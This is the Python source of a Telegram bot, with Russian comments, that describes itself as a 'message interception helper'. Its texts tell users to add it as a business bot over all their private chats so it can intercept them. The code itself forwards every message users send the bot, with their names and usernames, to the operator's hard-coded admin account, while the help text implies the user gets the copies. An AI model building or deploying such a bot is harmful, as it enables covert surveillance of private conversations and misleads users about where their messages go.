import os
import json
import asyncio
from aiohttp import web
import aiohttp

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
OWNER_USERNAME = "black_ide"  # Твой юзернейм

if not BOT_TOKEN or not ADMIN_ID:
    raise ValueError("BOT_TOKEN и ADMIN_ID обязательны")

# ============ КЛАВИАТУРЫ ============
MAIN_KEYBOARD = {
    "inline_keyboard": [
        [
            {"text": "📊 Статистика", "callback_data": "stats"},
            {"text": "👤 Помощь", "callback_data": "help"}
        ],
        [
            {"text": "⚙️ Настройки", "callback_data": "settings"},
            {"text": "📩 Связаться с админом", "url": "https://t.me/black_ide"}
        ],
        [
            {"text": "🔗 Подключить бота", "callback_data": "connect"}
        ]
    ]
}

CONNECT_KEYBOARD = {
    "inline_keyboard": [
        [
            {"text": "✅ Подключить как бизнес-бота", "callback_data": "connect_business"},
            {"text": "❌ Отмена", "callback_data": "cancel"}
        ]
    ]
}

HELP_TEXT = (
    "👋 *Как работает бот:*\n\n"
    "1. Подключи бота как *бизнес-бота* в настройках Telegram\n"
    "2. Бот будет перехватывать все сообщения из чатов\n"
    "3. Ты будешь получать копии в админ-чат\n\n"
    "📩 *Связаться с админом:* @black_ide"
)

STATS_TEXT = (
    "📊 *Статистика*\n\n"
    "✅ Бот активен\n"
    "📨 Сообщений обработано: 0\n"
    "👥 Подключённых чатов: 0\n"
    "⏱ Время работы: постоянно"
)

# ============ ОТПРАВКА СООБЩЕНИЙ ============
async def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()

async def answer_callback(callback_id, text, show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    payload = {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": show_alert
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()

# ============ ВЕБХУК ============
async def handle_webhook(request):
    try:
        data = await request.json()
        print(f"📥 Получен запрос: {json.dumps(data, indent=2)}")
        
        # --- Обработка команды /start ---
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user = message.get("from", {})
            text = message.get("text", "")
            username = user.get("username", "без юзера")
            full_name = user.get("first_name", "") + " " + user.get("last_name", "")
            
            print(f"📩 Сообщение от {full_name} (@{username}): {text}")
            
            # Отправляем копию админу (если это не админ)
            if chat_id != ADMIN_ID:
                await send_message(
                    ADMIN_ID,
                    f"📩 От: {full_name} (@{username})\n\n{text}"
                )
            
            # Если команда /start — показываем меню
            if text == "/start":
                welcome_text = (
                    f"👋 *Привет, {full_name}!*\n\n"
                    "Я — *помощник для перехвата сообщений*.\n"
                    "Подключи меня как бизнес-бота, и я буду пересылать тебе все сообщения из чатов.\n\n"
                    "👇 Выбери действие:"
                )
                await send_message(chat_id, welcome_text, MAIN_KEYBOARD)
            else:
                # Обычный ответ на любое сообщение
                await send_message(chat_id, "✅ Сообщение получено! Выбери действие в меню.", MAIN_KEYBOARD)
        
        # --- Обработка нажатий на кнопки ---
        elif "callback_query" in data:
            callback = data["callback_query"]
            callback_id = callback["id"]
            chat_id = callback["message"]["chat"]["id"]
            data_callback = callback.get("data", "")
            user = callback.get("from", {})
            username = user.get("username", "без юзера")
            
            print(f"🔄 Нажата кнопка: {data_callback} от @{username}")
            
            if data_callback == "help":
                await send_message(chat_id, HELP_TEXT, MAIN_KEYBOARD)
                await answer_callback(callback_id, "📖 Помощь открыта")
            
            elif data_callback == "stats":
                await send_message(chat_id, STATS_TEXT, MAIN_KEYBOARD)
                await answer_callback(callback_id, "📊 Статистика")
            
            elif data_callback == "settings":
                await send_message(chat_id, "⚙️ *Настройки*\n\nСкоро здесь будут настройки бота.", MAIN_KEYBOARD)
                await answer_callback(callback_id, "⚙️ Настройки")
            
            elif data_callback == "connect":
                connect_text = (
                    "🔗 *Как подключить бота:*\n\n"
                    "1. Открой *Настройки Telegram* → *Бизнес-боты*\n"
                    "2. Нажми *Добавить* и введи: @ne_otvechu_bot\n"
                    "3. Выбери *Все личные чаты* или *Только выбранные*\n"
                    "4. Готово! Бот начнёт перехватывать сообщения.\n\n"
                    "Если нет раздела *Бизнес-боты* — напиши админу @black_ide"
                )
                await send_message(chat_id, connect_text, CONNECT_KEYBOARD)
                await answer_callback(callback_id, "🔗 Инструкция открыта")
            
            elif data_callback == "connect_business":
                await send_message(
                    chat_id,
                    "✅ *Готово!*\n\n"
                    "Теперь открой *Настройки Telegram* → *Бизнес-боты*\n"
                    "И добавь туда @ne_otvechu_bot",
                    MAIN_KEYBOARD
                )
                await answer_callback(callback_id, "✅ Инструкция отправлена")
            
            elif data_callback == "cancel":
                await send_message(chat_id, "❌ Действие отменено.", MAIN_KEYBOARD)
                await answer_callback(callback_id, "❌ Отменено")
            
            else:
                await answer_callback(callback_id, "⚠️ Неизвестная команда")
        
        else:
            print(f"⚠️ Другой тип обновления: {list(data.keys())}")
            
    except Exception as e:
        print(f"❌ Ошибка в handle_webhook: {e}")
    
    return web.Response(text="OK")

# ============ ЗАПУСК ============
async def on_startup():
    WEBHOOK_URL = os.getenv("WEBHOOK_URL")
    if WEBHOOK_URL:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}&drop_pending_updates=true"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                result = await resp.json()
                if result.get("ok"):
                    print(f"✅ Вебхук установлен: {WEBHOOK_URL}")
                else:
                    print(f"❌ Ошибка: {result}")

app = web.Application()
app.router.add_post("/webhook", handle_webhook)
app.router.add_get("/", lambda request: web.Response(text="I'm alive ✅"))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(on_startup())
    print(f"🚀 Запуск на порту {port}...")
    web.run_app(app, host="0.0.0.0", port=port)
